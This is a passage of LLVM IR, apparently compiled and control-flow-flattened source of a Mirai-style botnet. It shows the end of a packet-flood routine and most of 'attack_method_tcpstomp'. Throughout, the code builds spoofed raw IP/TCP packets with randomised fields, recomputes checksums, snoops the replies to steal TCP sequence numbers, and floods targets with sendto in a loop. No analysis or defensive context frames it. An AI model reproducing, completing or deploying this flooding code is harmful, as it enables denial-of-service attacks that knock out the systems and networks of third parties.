  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i32 0, i32 1
  %322 = load i32, i32* %321, align 4
  %323 = call i32 @ntohl(i32 %322) #8
  %324 = call i32 @rand_next()
  %325 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %326 = load i32, i32* %9, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %325, i64 %327
  %329 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %328, i32 0, i32 2
  %330 = load i8, i8* %329, align 4
  %331 = zext i8 %330 to i32
  %332 = lshr i32 %324, %331
  %333 = add i32 %323, %332
  %334 = call i32 @htonl(i32 %333) #8
  %335 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 9
  store i32 %334, i32* %336, align 4
  store i32 -1121110933, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  %338 = load i32, i32* %28, align 4
  %339 = icmp eq i32 %338, -1
  %340 = select i1 %339, i32 963719093, i32 1888885508
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = call i32 @rand_next()
  %343 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i32 0, i32 8
  store i32 %342, i32* %344, align 4
  store i32 1888885508, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = load i16, i16* %13, align 2
  %347 = zext i16 %346 to i32
  %348 = icmp eq i32 %347, 65535
  %349 = select i1 %348, i32 -322665144, i32 -1949605799
  store i32 %349, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = call i32 @rand_next()
  %352 = and i32 %351, 65535
  %353 = trunc i32 %352 to i16
  %354 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %355 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %354, i32 0, i32 3
  store i16 %353, i16* %355, align 4
  store i32 -1949605799, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  %357 = load i16, i16* %16, align 2
  %358 = zext i16 %357 to i32
  %359 = icmp eq i32 %358, 65535
  %360 = select i1 %359, i32 1345129081, i32 1013730229
  store i32 %360, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = call i32 @rand_next()
  %363 = and i32 %362, 65535
  %364 = trunc i32 %363 to i16
  %365 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %366 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %365, i32 0, i32 0
  store i16 %364, i16* %366, align 4
  store i32 1013730229, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %368 = load i16, i16* %17, align 2
  %369 = zext i16 %368 to i32
  %370 = icmp eq i32 %369, 65535
  %371 = select i1 %370, i32 1113628145, i32 881633951
  store i32 %371, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = call i32 @rand_next()
  %374 = and i32 %373, 65535
  %375 = trunc i32 %374 to i16
  %376 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %377 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %376, i32 0, i32 1
  store i16 %375, i16* %377, align 2
  store i32 881633951, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = load i32, i32* %18, align 4
  %380 = icmp eq i32 %379, 65535
  %381 = select i1 %380, i32 259760430, i32 -302726878
  store i32 %381, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = call i32 @rand_next()
  %384 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 2
  store i32 %383, i32* %385, align 4
  store i32 -302726878, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = load i32, i32* %19, align 4
  %388 = icmp eq i32 %387, 65535
  %389 = select i1 %388, i32 -1629342123, i32 1216247717
  store i32 %389, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = call i32 @rand_next()
  %392 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 3
  store i32 %391, i32* %393, align 4
  store i32 1216247717, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = load i8, i8* %27, align 1
  %396 = icmp ne i8 %395, 0
  %397 = select i1 %396, i32 -1144596470, i32 1553793169
  store i32 %397, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8*, i8** %35, align 8
  %400 = load i32, i32* %26, align 4
  call void @rand_str(i8* %399, i32 %400)
  store i32 1553793169, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %403 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %402, i32 0, i32 7
  store i16 0, i16* %403, align 2
  %404 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %405 = bitcast %struct.iphdr* %404 to i16*
  %406 = call zeroext i16 @checksum_generic(i16* %405, i32 20)
  %407 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 7
  store i16 %406, i16* %408, align 2
  %409 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %410 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %409, i32 0, i32 6
  store i16 0, i16* %410, align 4
  %411 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %412 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %413 = bitcast %struct.tcphdr* %412 to i8*
  %414 = load i32, i32* %26, align 4
  %415 = sext i32 %414 to i64
  %416 = add i64 20, %415
  %417 = trunc i64 %416 to i16
  %418 = call zeroext i16 @htons(i16 zeroext %417) #8
  %419 = load i32, i32* %26, align 4
  %420 = sext i32 %419 to i64
  %421 = add i64 20, %420
  %422 = trunc i64 %421 to i32
  %423 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %411, i8* %413, i16 zeroext %418, i32 %422)
  %424 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 6
  store i16 %423, i16* %425, align 4
  %426 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %427 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %426, i32 0, i32 1
  %428 = load i16, i16* %427, align 2
  %429 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %430 = load i32, i32* %9, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %429, i64 %431
  %433 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i32 0, i32 0
  %434 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %433, i32 0, i32 1
  store i16 %428, i16* %434, align 2
  %435 = load i32, i32* %10, align 4
  %436 = load i8*, i8** %32, align 8
  %437 = load i32, i32* %26, align 4
  %438 = sext i32 %437 to i64
  %439 = add i64 40, %438
  %440 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %441 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %442 = load i32, i32* %9, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %441, i64 %443
  %445 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %444, i32 0, i32 0
  %446 = bitcast %struct.sockaddr_in* %445 to %struct.sockaddr*
  store %struct.sockaddr* %446, %struct.sockaddr** %440, align 8
  %447 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %448 = load %struct.sockaddr*, %struct.sockaddr** %447, align 8
  %449 = call i64 @sendto(i32 %435, i8* %436, i64 %439, i32 16384, %struct.sockaddr* %448, i32 16)
  store i32 21448375, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  %451 = load i32, i32* %9, align 4
  %452 = add nsw i32 %451, 1
  store i32 %452, i32* %9, align 4
  store i32 -1460452432, i32* %switchVar
  br label %loopEnd

; <label>:453:                                    ; preds = %loopEntry
  store i32 -1904391255, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %453, %450, %401, %398, %394, %390, %386, %382, %378, %372, %367, %361, %356, %350, %345, %341, %337, %316, %293, %287, %286, %285, %282, %279, %273, %178, %174, %126, %120, %119, %116, %110, %109, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_xmas_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #7
  %47 = bitcast i8* %46 to %struct.attack_xmas_data*
  store %struct.attack_xmas_data* %47, %struct.attack_xmas_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #7
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %103, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -925937162, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -925937162, label %first
    i32 539891463, label %106
    i32 1709846207, label %107
    i32 280939926, label %113
    i32 -2082354696, label %116
    i32 -454187251, label %117
    i32 -993148945, label %123
    i32 859936315, label %124
    i32 188609458, label %128
    i32 -1737374842, label %129
    i32 -1223731770, label %145
    i32 1965363803, label %166
    i32 -927480458, label %175
    i32 -1242941648, label %180
    i32 1949316042, label %185
    i32 -296433355, label %189
    i32 1743172653, label %197
    i32 -1862202889, label %209
    i32 959943715, label %210
    i32 -1093326855, label %219
    i32 -223629650, label %224
    i32 796393572, label %237
    i32 1176541184, label %246
    i32 593711874, label %255
    i32 -111607719, label %347
    i32 707192522, label %351
    i32 48913184, label %473
    i32 -998658474, label %482
    i32 -423975433, label %491
    i32 1805369366, label %494
    i32 1136020294, label %495
    i32 467226309, label %496
    i32 1819051964, label %497
    i32 -231164070, label %503
    i32 1228743892, label %506
    i32 -1728892030, label %507
    i32 1419412550, label %508
    i32 -289231491, label %511
    i32 1748694781, label %512
    i32 71164904, label %513
    i32 2125387852, label %519
    i32 1116551493, label %537
    i32 475734126, label %543
    i32 -1629423754, label %547
    i32 -1447358133, label %550
    i32 -801947389, label %622
    i32 -806330094, label %625
    i32 -2063620666, label %626
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %104 = icmp eq i32 %.reload, -1
  %105 = select i1 %104, i32 539891463, i32 1709846207
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 -2063620666, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %108 = load i32, i32* %10, align 4
  %109 = bitcast i32* %9 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #7
  %111 = icmp eq i32 %110, -1
  %112 = select i1 %111, i32 280939926, i32 -2082354696
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %10, align 4
  %115 = call i32 @close(i32 %114)
  store i32 -2063620666, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -454187251, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %9, align 4
  %119 = load i8, i8* %5, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp slt i32 %118, %120
  %122 = select i1 %121, i32 -993148945, i32 -289231491
  store i32 %122, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  store i32 859936315, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %125, i32* %26, align 4
  %126 = icmp eq i32 %125, -1
  %127 = select i1 %126, i32 188609458, i32 -1737374842
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 1419412550, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i32, i32* %26, align 4
  %131 = load i32, i32* %26, align 4
  %132 = call i32 (i32, i32, ...) @fcntl(i32 %131, i32 3, i32 0)
  %133 = or i32 %132, 2048
  %134 = call i32 (i32, i32, ...) @fcntl(i32 %130, i32 4, i32 %133)
  %135 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %135, align 4
  %136 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %137 = load i32, i32* %9, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i64 %138
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %139, i32 0, i32 2
  %141 = load i8, i8* %140, align 4
  %142 = zext i8 %141 to i32
  %143 = icmp slt i32 %142, 32
  %144 = select i1 %143, i32 -1223731770, i32 1965363803
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %147 = load i32, i32* %9, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %146, i64 %148
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i32 0, i32 1
  %151 = load i32, i32* %150, align 4
  %152 = call i32 @ntohl(i32 %151) #8
  %153 = call i32 @rand_next()
  %154 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 4
  %160 = zext i8 %159 to i32
  %161 = lshr i32 %153, %160
  %162 = add i32 %152, %161
  %163 = call i32 @htonl(i32 %162) #8
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %165 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %164, i32 0, i32 0
  store i32 %163, i32* %165, align 4
  store i32 -927480458, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %168 = load i32, i32* %9, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %174 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %173, i32 0, i32 0
  store i32 %172, i32* %174, align 4
  store i32 -927480458, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i16, i16* %17, align 2
  %177 = zext i16 %176 to i32
  %178 = icmp eq i32 %177, 65535
  %179 = select i1 %178, i32 -1242941648, i32 1949316042
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = call i32 @rand_next()
  %182 = and i32 %181, 65535
  %183 = trunc i32 %182 to i16
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %183, i16* %184, align 2
  store i32 -296433355, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i16, i16* %17, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #8
  %188 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %187, i16* %188, align 2
  store i32 -296433355, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i32, i32* %26, align 4
  %191 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %192 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %192, %struct.sockaddr** %191, align 8
  %193 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %194 = load %struct.sockaddr*, %struct.sockaddr** %193, align 8
  %195 = call i32 @connect(i32 %190, %struct.sockaddr* %194, i32 16)
  %196 = call i64 @time(i64* null) #7
  store i64 %196, i64* %31, align 8
  store i32 1743172653, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  store i32 16, i32* %29, align 4
  %198 = load i32, i32* %10, align 4
  %199 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %200 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %201 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %201, %struct.sockaddr** %200, align 8
  %202 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %203 = load %struct.sockaddr*, %struct.sockaddr** %202, align 8
  %204 = call i64 @recvfrom(i32 %198, i8* %199, i64 256, i32 16384, %struct.sockaddr* %203, i32* %29)
  %205 = trunc i64 %204 to i32
  store i32 %205, i32* %33, align 4
  %206 = load i32, i32* %33, align 4
  %207 = icmp eq i32 %206, -1
  %208 = select i1 %207, i32 -1862202889, i32 959943715
  store i32 %208, i32* %switchVar
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  store i32 -2063620666, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %212 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 4
  %214 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %215 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 4
  %217 = icmp eq i32 %213, %216
  %218 = select i1 %217, i32 -1093326855, i32 1819051964
  store i32 %218, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %33, align 4
  %221 = sext i32 %220 to i64
  %222 = icmp ugt i64 %221, 40
  %223 = select i1 %222, i32 -223629650, i32 1819051964
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %226 = getelementptr inbounds i8, i8* %225, i64 20
  %227 = bitcast i8* %226 to %struct.tcphdr*
  store %struct.tcphdr* %227, %struct.tcphdr** %35, align 8
  %228 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 0
  %230 = load i16, i16* %229, align 4
  %231 = zext i16 %230 to i32
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %233 = load i16, i16* %232, align 2
  %234 = zext i16 %233 to i32
  %235 = icmp eq i32 %231, %234
  %236 = select i1 %235, i32 796393572, i32 467226309
  store i32 %236, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 4
  %240 = load i16, i16* %239, align 4
  %241 = lshr i16 %240, 9
  %242 = and i16 %241, 1
  %243 = zext i16 %242 to i32
  %244 = icmp ne i32 %243, 0
  %245 = select i1 %244, i32 1176541184, i32 48913184
  store i32 %245, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 4
  %249 = load i16, i16* %248, align 4
  %250 = lshr i16 %249, 12
  %251 = and i16 %250, 1
  %252 = zext i16 %251 to i32
  %253 = icmp ne i32 %252, 0
  %254 = select i1 %253, i32 593711874, i32 48913184
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %257 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %256, i32 0, i32 0
  %258 = load i32, i32* %257, align 4
  %259 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %260 = load i32, i32* %9, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %259, i64 %261
  %263 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %262, i32 0, i32 0
  store i32 %258, i32* %263, align 4
  %264 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 2
  %266 = load i32, i32* %265, align 4
  %267 = call i32 @ntohl(i32 %266) #8
  %268 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %268, i64 %270
  %272 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %271, i32 0, i32 1
  store i32 %267, i32* %272, align 4
  %273 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %274 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %273, i32 0, i32 3
  %275 = load i32, i32* %274, align 4
  %276 = call i32 @ntohl(i32 %275) #8
  %277 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %278 = load i32, i32* %9, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %277, i64 %279
  %281 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %280, i32 0, i32 2
  store i32 %276, i32* %281, align 4
  %282 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 1
  %284 = load i16, i16* %283, align 2
  %285 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %288, i32 0, i32 3
  store i16 %284, i16* %289, align 4
  %290 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %291 = load i16, i16* %290, align 2
  %292 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
